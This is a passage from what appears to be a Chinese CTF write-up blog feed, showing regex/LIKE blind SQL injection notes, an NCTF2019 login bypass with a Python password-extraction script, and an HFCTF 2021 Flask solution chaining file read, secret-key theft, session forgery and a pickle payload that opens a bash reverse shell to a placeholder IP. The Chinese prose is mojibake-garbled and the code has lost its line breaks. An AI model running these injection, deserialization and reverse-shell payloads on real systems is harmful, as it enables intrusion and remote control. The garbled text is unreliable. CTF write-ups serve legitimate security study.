æ‰€ä½¿ç”¨çš„å…ƒå­—ç¬¦ã€‚å½“æŒ‡å®šæ—¶ï¼Œå®ƒåŒ¹é…ä¸‹åˆ’çº¿ (_)ã€‚</td></tr><tr><td style="text-align:center">|</td><td style="text-align:left">ç®¡é“ç¬¦å·ç”¨äºæŒ‡å®šåŒ¹é…å­—ç¬¦ä¸²æ—¶è¦ä½¿ç”¨çš„æ›¿ä»£æ¨¡å¼ã€‚åœ¨ç”±ç«–çº¿åˆ†éš”çš„ä¸€è¡Œæ¨¡å¼ä¸­ï¼Œç«–çº¿è¢«è§£é‡Šä¸º ORï¼ŒåŒ¹é…è¿‡ç¨‹ä»æœ€å·¦ä¾§çš„æ¨¡å¼å¼€å§‹ï¼Œåœ¨æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹æ—¶åœæ­¢ã€‚å› æ­¤ï¼Œæ‚¨åº”æŒ‰ä¼˜å…ˆçº§çš„é™åºé¡ºåºåˆ—å‡ºæ¨¡å¼ã€‚æ‚¨å¯ä»¥æŒ‡å®šä»»æ„æ•°é‡çš„æ›¿ä»£æ¨¡å¼ã€‚</td></tr><tr><td style="text-align:center">()</td><td style="text-align:left">å½“å·¦æ‹¬å·å’Œå³æ‹¬å·ç”¨äºæ­£åˆ™è¡¨è¾¾å¼çš„å„ä¸ªç»„åˆéƒ¨åˆ†æ—¶ï¼Œå®ƒä»¬ä¸ºå…ƒå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>(ab)*</code> åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ª ab çš„é‡å¤é¡¹ã€‚ä¸ä½¿ç”¨æ•°å­¦è¡¨è¾¾å¼ä¸€æ ·ï¼Œæ‚¨ä½¿ç”¨ç»„åˆæ¥æ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼å„éƒ¨åˆ†çš„è®¡ç®—é¡ºåºã€‚</td></tr><tr><td style="text-align:center">{}</td><td style="text-align:left">å½“å·¦å¤§æ‹¬å·å’Œå³å¤§æ‹¬å·ç”¨äºæŒ‡å®šé‡è¯æ—¶ï¼Œå®ƒä»¬ä¸ºå…ƒå­—ç¬¦ã€‚é‡è¯æŒ‡å®šä¸€ä¸ªæ¨¡å¼è¦æ„æˆæŸä¸ªåŒ¹é…æ‰€å¿…é¡»é‡å¤çš„æ¬¡æ•°ã€‚ä¾‹å¦‚ï¼š<br>{m}   åŒ¹é…æŸä¸ªå­—ç¬¦æ­£å¥½ m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€˜519-[0-9]{3}-[0-9]{4}â€™ åŒ¹é… 519 åœ°åŒºå·ä¸­çš„ä¸€ä¸ªç”µè¯å·ç ï¼ˆå‡å®šæ•°æ®æŒ‰è¯­æ³•ä¸­å®šä¹‰çš„æ–¹å¼è¿›è¡Œæ ¼å¼è®¾ç½®ï¼‰ã€‚<br><br>{m,}   åŒ¹é…æŸä¸ªå­—ç¬¦è‡³å°‘ m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€˜[0-9]{5,}â€™ åŒ¹é…ä»»ä½•å«æœ‰äº”ä¸ªæˆ–æ›´å¤šæ•°å­—çš„å­—ç¬¦ä¸²ã€‚<br><br>{m,n}   åŒ¹é…æŸä¸ªå­—ç¬¦è‡³å°‘ m æ¬¡ï¼Œä½†ä¸è¶…è¿‡ n æ¬¡ã€‚ä¾‹å¦‚ï¼ŒSIMILAR TO â€˜_{5,10}â€™ åŒ¹é…ä»»ä½•å«æœ‰ 5 åˆ° 10ï¼ˆå« 5 å’Œ 10ï¼‰ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚<br></td></tr><tr><td style="text-align:center">\</td><td style="text-align:left">åæ–œçº¿è¢«ç”¨ä½œå…ƒå­—ç¬¦çš„è½¬ä¹‰å­—ç¬¦ã€‚å®ƒä¹Ÿå¯è¢«ç”¨äºè½¬ä¹‰éå…ƒå­—ç¬¦ã€‚</td></tr><tr><td style="text-align:center">^</td><td style="text-align:left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ^ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ ä¹‹åçš„ä½ç½®ã€‚</td></tr><tr><td style="text-align:center">$</td><td style="text-align:left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ$ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ ä¹‹å‰çš„ä½ç½®ã€‚</td></tr><tr><td style="text-align:center">.</td><td style="text-align:left">åŒ¹é…é™¤ â€œ\nâ€ ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è¦åŒ¹é…åŒ…æ‹¬ â€˜\nâ€™ åœ¨å†…çš„ä»»ä½•å­—ç¬¦ï¼Œè¯·ä½¿ç”¨è±¡ â€˜[.\n]â€™ çš„æ¨¡å¼ã€‚</td></tr><tr><td style="text-align:center">:</td><td style="text-align:left">åœ¨å­—ç¬¦é›†ä¸­ä½¿ç”¨å†’å·æ¥æŒ‡å®šå­å­—ç¬¦ç±»ã€‚ä¾‹å¦‚ï¼Œ<code>'[[:alnum:]]'</code></td></tr></tbody></table><ul><li>å¤šæ•°æ­£åˆ™è¡¨è¾¾å¼å®ç°ä½¿ç”¨å•ä¸ªåæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼Œä¸€éèƒ½ä½¿ç”¨è¿™äº›å­—ç¬¦æœ¬èº«ï¼Œä½†æ˜¯MySQLè¦æ±‚ä¸¤ä¸ªåæ–œæ ï¼ˆMySQLè‡ªå·±è§£é‡Šä¸€ä¸ªï¼Œæ­£åˆ™è¡¨è¾¾å¼åº“è§£é‡Šå¦ä¸€ä¸ªï¼‰ã€‚</li><li>^ ç¬¦å·çš„åŒé‡ç”¨é€”ï¼š ^åœ¨é›†åˆä¸­ï¼ˆç”¨ [ ] å®šä¹‰ï¼‰æ—¶ç”¨å®ƒæ¥å¦å®šè¯¥é›†åˆï¼Œå¦åˆ™ç”¨æ¥æŒ‡å®šä¸²çš„å¼€å§‹å¤„ã€‚</li></ul><p>è¡¨è¾¾å¼é¡ºåº</p><p><code>'^e[a-z]' -&gt; '^em[a-z]' -&gt; '^ema[a-z]' -&gt; '^emai[a-z]'-&gt; '^email[a-z]' -&gt; FALSE</code></p><p>å®éªŒè¡¨æ˜ï¼šåœ¨limit 0,1ä¸‹ï¼Œregexpä¼šåŒ¹é…æ‰€æœ‰çš„é¡¹ã€‚æˆ‘ä»¬åœ¨ä½¿ç”¨regexpæ—¶ï¼Œè¦æ³¨æ„æœ‰å¯èƒ½æœ‰å¤šä¸ªé¡¹ï¼ŒåŒæ—¶è¦ä¸€ä¸ªä¸ªå­—ç¬¦å»çˆ†ç ´ã€‚å¦‚ï¼šwhere table_schema=â€˜securityâ€™ limit 0,1ã€‚table_schema='securityâ€™å·²ç»èµ·åˆ°äº†é™å®šä½œç”¨äº†ï¼Œlimitæœ‰æ²¡æœ‰å·²ç»ä¸é‡è¦äº†</p><h3 id="LIKEæ³¨å…¥"><a class="header-anchor" href="#LIKEæ³¨å…¥">ğŸ­</a>LIKEæ³¨å…¥</h3><p><strong>likeåŒ¹é…</strong><br>ç™¾åˆ†æ¯”(%)é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¸‹åˆ’çº¿<code>_</code>é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚</p><p>like 's%'åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºs</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">s</span>%&#x27;,3 --+</span></code></pre><p>.like 'se%'åˆ¤æ–­å‰é¢ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºse</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">se</span>%&#x27;,3 --+</span></code></pre><p>like â€˜%se%â€™ åˆ¤æ–­æ˜¯å¦åŒ…å«seä¸¤ä¸ªå­—ç¬¦ä¸²</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;%<span class="hljs-title">se</span>%&#x27;,3 --+</span></code></pre><p>like '_____'åˆ¤æ–­æ˜¯å¦ä¸º5ä¸ªå­—ç¬¦</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">_____</span>&#x27;,3 --+</span></code></pre><p>like â€˜s____â€™ åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºs</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">s____</span>&#x27;,3 --+</span></code></pre><p>ç›²æ³¨:</p><blockquote><p>åˆ¤æ–­æ•°æ®åº“é•¿åº¦<br>å¯ç”¨length()å‡½æ•°ï¼Œä¹Ÿå¯ç”¨_ï¼Œå¦‚ï¼š<code>' or database() like '________'--+</code><br>åˆ¤æ–­æ•°æ®åº“å</p><p><code>' or database() like 's%'--+</code>ä¹Ÿå¯ç”¨<code>' or database() like 's_______'--+</code></p></blockquote><p>è¡¨è¾¾å¼çš„é¡ºåºï¼š</p><p><code>'^e[a-z]' -&gt; '^em[a-z]' -&gt; '^ema[a-z]' -&gt; '^emai[a-z]'-&gt; '^email[a-z]' -&gt; TRUE</code></p><p>ä¹‹æ‰€ä»¥è¡¨è¾¾å¼ news[a-z]æŸ¥è¯¢åè¿”å›æ­£ç¡®æ˜¯åº”ä¸º%ä»£è¡¨0-nä¸ªå­—ç¬¦ï¼Œä½¿ç”¨&quot;_&quot;åˆ™åªèƒ½ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ã€‚æ•…ç¡®è®¤åç»­æ˜¯å¦è¿˜æœ‰å­—ç¬¦ç”¨å¦‚ä¸‹è¡¨è¾¾å¼</p><p><code>'email%' TRUE -&gt; 'email_' FALSE</code></p><p>åŒç†å¯ä»¥ç”¨ç›¸åŒçš„æ–¹æ³•è·å–å­—æ®µï¼Œå€¼ã€‚</p><h4 id="LIKE-å’Œ-REGEXPä¹‹é—´çš„å·®åˆ«"><a class="header-anchor" href="#LIKE-å’Œ-REGEXPä¹‹é—´çš„å·®åˆ«">ğŸ­</a>LIKE å’Œ REGEXPä¹‹é—´çš„å·®åˆ«</h4><p>LIKE åŒ¹é…æ•´ä¸ªåˆ—ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼ŒLIKE å°†ä¸ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œä¹Ÿä¸ä¼šè¢«è¿”å›ï¼ˆé™¤éä½¿ç”¨é€šé…ç¬¦ï¼‰ã€‚è€Œ REGEXP åœ¨åˆ—å€¼å†…è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼ŒREGEXP å°†ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œå°†è¢«è¿”å›ï¼Œå¹¶ä¸” REGEXP èƒ½åŒ¹é…æ•´ä¸ªåˆ—å€¼ï¼ˆä¸ LIKE ç›¸åŒçš„ä½œç”¨ï¼‰ã€‚</p><h1>[NCTF2019]SQLi</h1><p>ä¸»é¡µæ˜¯ä¸€ä¸ªç™»å½•æ¡† ã€‚æŠŠsqlè¯­å¥æ˜¾ç¤ºå‡ºæ¥äº†:</p><p><img src="/2021/08/01/regexp/2.png" alt="2"></p><p>ä¿¡æ¯æœé›†ï¼Œrobots.txtï¼Œæœ‰ä¸ªhint.txt</p><pre><code class="hljs sql">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">greatest</span>|%<span class="hljs-number">00</span>|\<span class="hljs-string">&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><span class="hljs-string">If $_POST[&#x27;</span>passwd<span class="hljs-string">&#x27;] === admin&#x27;</span>s <span class="hljs-keyword">password</span>,<span class="hljs-keyword">Then</span> you will <span class="hljs-keyword">get</span> the flag;</code></pre><p>å¯†ç ç­‰äºadminå¯†ç å³å¯è·å¾—flagã€‚å¹¶æ²¡æœ‰å¯¹ç”¨æˆ·ååšé™åˆ¶ï¼Œç”±äºå•å¼•å·è¢«ç¦ç”¨ï¼Œä½¿ç”¨ \ è½¬ä¹‰andå‰é¢çš„é‚£ä¸ªå•å¼•å·ï¼Œä½¿å¾—<code>'\' and passwd='</code>å½¢æˆé—­åˆ,æ„é€ passwdå¤„ä¸º<code> ||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code><br>ç”¨regexpæŸ¥è¯¢passwd ^åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´ %00æˆªæ–­åé¢çš„å†…å®¹ï¼Œéœ€è¦æŠ“åŒ…æäº¤ï¼ˆç›´æ¥æäº¤ï¼Œä¼šè¢«url encode å˜ä¸º%2500è¢«é»‘åå•æ‹¦æˆªï¼‰å³ä¸º <code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code><br>æŸ¥è¯¢è¯­å¥å˜ä¸º: <code>select * from users where username='\' and passwd='||/**/passwd/**/regexp</code><br>ç”¨<code> username='\' and passwd='||1;%00'</code>æµ‹è¯•æ¡ä»¶ä¸ºçœŸæ—¶å°±ä¼šè·³è½¬åˆ°web.php;(fuzzä¹Ÿå¯ä»¥) æ¡ä»¶ä¸ºå‡æ—¶å°±ä¼šå›åˆ°ç™»é™†é¡µã€‚</p><p>è„šæœ¬è·‘ä¸€ä¸‹å¯†ç ï¼š</p><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requestsfrom urllib <span class="hljs-keyword">import</span> parse<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span>str1 = string.ascii_letters+<span class="hljs-string">&#x27;_&#x27;</span>+string.digitsurl=<span class="hljs-string">&#x27;http://9d86404e-b5c0-41ff-b8ef-f9bbf6da8e8c.node3.buuoj.cn/index.php&#x27;</span>flag=<span class="hljs-string">&#x27;79&#x27;</span>a=parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> str1:        <span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,              <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;||passwd/**/regexp/**/0x&quot;</span>+flag+hex(ord(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)+<span class="hljs-string">&quot;;&quot;</span>+a            &#125;        r=requests.post(url=url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;welcome.php&#x27;</span> <span class="hljs-built_in">in</span> r.<span class="hljs-keyword">text</span>:            flag+=hex(ord(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)            print(flag)            break        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.5</span>)        #é˜²æ­¢<span class="hljs-number">429</span></code></pre><p>ç”¨å¯†ç ç™»å½•å³å¯è·å¾—flag</p><p><img src="/2021/08/01/regexp/3.png" alt="3"></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_36761831/article/details/82862135">https://blog.csdn.net/qq_36761831/article/details/82862135</a></p><p><a href="https://blog.csdn.net/qq_35569814/article/details/100526540">https://blog.csdn.net/qq_35569814/article/details/100526540</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/106029042">https://blog.csdn.net/weixin_43610673/article/details/106029042</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆå››ï¼‰</title>
    <link href="/2021/07/30/black/"/>
    <url>/2021/07/30/black/</url>
    
    <content type="html"><![CDATA[<h1>[HFCTF 2021 Final]easyflask</h1><p>ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ ¹æ®æç¤ºè¯»å–æºç </p><pre><code class="hljs lua">#!/usr/bin/python3<span class="hljs-number">.6</span>import <span class="hljs-built_in">os</span>import picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.<span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;*******&quot;</span>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (object,), &#123;    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,&#125;)@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))def index_handler():    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):        u = pickle.dumps(User())        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span>@app.route(<span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))def file_handler():    <span class="hljs-built_in">path</span> = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)    <span class="hljs-built_in">path</span> = <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.join(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-built_in">path</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-built_in">path</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.isdir(<span class="hljs-built_in">path</span>) \            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span>    with <span class="hljs-built_in">open</span>(<span class="hljs-built_in">path</span>, <span class="hljs-string">&#x27;r&#x27;</span>) as fp:        content = fp.<span class="hljs-built_in">read</span>()    <span class="hljs-keyword">return</span> content@app.route(<span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))def admin_handler():    try:        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)        <span class="hljs-keyword">if</span> isinstance(u, dict):#å¦‚æœuå¯¹åº”çš„å€¼æ˜¯å­—å…¸ï¼Œä¼šè¯»å–  u.b            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))        u = pickle.loads(u)#pickleååºåˆ—åŒ–    except Exception:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, <span class="hljs-built_in">debug</span>=False)</code></pre><p><code>/file</code> è·¯ç”±ï¼Œç”¨æˆ·ä¸Šä¼ çš„ path ä¼šè¢«æ‹¼æ¥åˆ° static ç›®å½•åé¢ï¼Œè¿™é‡Œæœ‰ä¸ªtrickï¼Œå½“ os.path.join çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºç»å¯¹è·¯å¾„æ—¶æ‹¼æ¥çš„ç»“æœå°±æ˜¯è¯¥ç»å¯¹è·¯å¾„,å¯å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚æ­¤å¤„å¯¹å‚æ•°åšäº†ä¸€äº›é™åˆ¶ã€‚</p><img src="/2021/07/30/black/1.png" alt="1" style="zoom:67%;"><p><code>/admin</code> è·¯ç”±é‡Œä½¿ç”¨ pickle æ¨¡å—ç›´æ¥å°† session é‡Œçš„å†…å®¹ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–å¿…ç„¶åŒ…å«åˆ›å»ºæ–°å¯¹è±¡çš„æ“ä½œï¼Œå¦‚æœ <code>__reduce__</code> é‡ŒåŒ…å«æ”»å‡»ä»£ç å°±å¯ä»¥å®ç°RCEï¼Œååºåˆ—åŒ–çš„è¾“å‡ºå‚¨å­˜åœ¨ session é‡Œï¼Œä½†æ˜¯ session æ•°æ®éƒ½æ˜¯ flask åŠ å¯†è¿‡çš„ï¼Œåªæœ‰çŸ¥é“ secret_key æ‰èƒ½ä¼ªé€  session å®ç° RCEã€‚åˆ©ç”¨ä¼ªæ–‡ä»¶ç³»ç»Ÿ <code>/proc</code>ï¼Œç»“åˆå‰é¢çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¯ä»¥è¯»å–åˆ°è‡ªèº«çš„ç¯å¢ƒå˜é‡ï¼Œå³<code>/file?file=/proc/self/environ</code>ï¼Œå¾—åˆ°<code>secret_key</code>ã€‚</p><p><img src="/2021/07/30/black/2.png" alt="2"></p><h4 id="tips-Flask-sessionèº«ä»½ä¼ªé€ "><a class="header-anchor" href="#tips-Flask-sessionèº«ä»½ä¼ªé€ ">ğŸ­</a>tips:Flask-sessionèº«ä»½ä¼ªé€ </h4><p>flaskæ˜¯æŠŠsessionå­˜åœ¨å®¢æˆ·ç«¯çš„ï¼Œè€Œä¸”åªç»è¿‡base64ç¼–ç å’Œç”¨å¯†é’¥ç­¾åï¼Œè™½ç„¶æ²¡æœ‰æœ‰ç­¾åä¸å¯ä»¥ä¼ªé€ sessionï¼Œä½†æ˜¯æœ‰å¾ˆå¤šä¿¡æ¯æˆ‘ä»¬å¯ä»¥ç›´æ¥ä»sessionè§£ç æ‰¾å‡ºæ¥ã€‚</p><p>å¦‚ä¸€ä¸² <strong>session</strong> å€¼ä¸ºï¼š <strong>eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY</strong> ï¼Œè§£å¯†ï¼š</p><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> *s = &quot;eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY&quot;data,<span class="hljs-type">timestamp</span>,secret = s.split(<span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-type">int</span>.from_bytes(base64_decode(<span class="hljs-type">timestamp</span>),byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)</code></pre><p><img src="/2021/07/30/black/6.png" alt="6"></p><p>å³å¯è·å–ä¿¡æ¯ã€‚</p><p>flaskè§£å¯†è„šæœ¬ï¼š</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    decompress = <span class="hljs-literal">False</span>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):        payload = payload[<span class="hljs-number">1</span>:]        decompress = <span class="hljs-literal">True</span>    <span class="hljs-keyword">try</span>:        payload = base64_decode(payload)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>                        <span class="hljs-string">&#x27;an exception&#x27;</span>)    <span class="hljs-keyword">if</span> decompress:        <span class="hljs-keyword">try</span>:            payload = zlib.decompress(payload)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>                            <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(decryption(<span class="hljs-string">&quot;sessionå€¼&quot;</span>.encode()))</code></pre><p>FLASKåŠ å¯†è„šæœ¬ï¼š<br><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>å¼€å§‹ä¼ªé€ sessionï¼šï¼ˆåˆ©ç”¨åå¼¹shellæ„é€ çš„ç®€å•ååºåˆ—åŒ–ï¼‰</p><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<span class="hljs-keyword">import</span> os<span class="hljs-keyword">User</span> = <span class="hljs-keyword">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-keyword">object</span>,), &#123;    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;tyskill&#x27;</span>,    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,    <span class="hljs-string">&#x27;__reduce__&#x27;</span>: lambda o: (os.<span class="hljs-keyword">system</span>, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&#x27;&quot;,))&#125;)u = pickle.dumps(<span class="hljs-keyword">User</span>())print(b64encode(u).decode())//winå’Œlinuxä¸‹dumpsçš„ç»“æœä¸­åºåˆ—åŒ–å­—ç¬¦ä¸²å£°æ˜ç³»ç»Ÿçš„æ ‡è¯†ç¬¦ä¸åŒï¼šLinux=&gt;posixï¼›Windows=&gt;ntï¼Œéœ€è¦å°†è„šæœ¬æ”¾åœ¨Linuxç¯å¢ƒä¸‹ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</code></pre><p>æ‰§è¡Œ</p><p><img src="/2021/07/30/black/4.png" alt="4"></p><p>åŠ å¯†ï¼š</p><p><img src="/2021/07/30/black/5.png" alt="5"></p><p>æ›¿æ¢æ‰sessionï¼Œç”¨é¶æœºç›‘å¬å³å¯RCEã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/LYJ20010728/article/details/117422046">https://blog.csdn.net/LYJ20010728/article/details/117422046</a></p><p><a href="https://xz.aliyun.com/t/3569#toc-0">https://xz.aliyun.com/t/3569#toc-0</a></p><h1>[SWPUCTF 2018]SimplePHP</h1><p>æŸ¥çœ‹æ–‡ä»¶é¡µé¢å¯ä»¥ç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹</p><p>file.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span 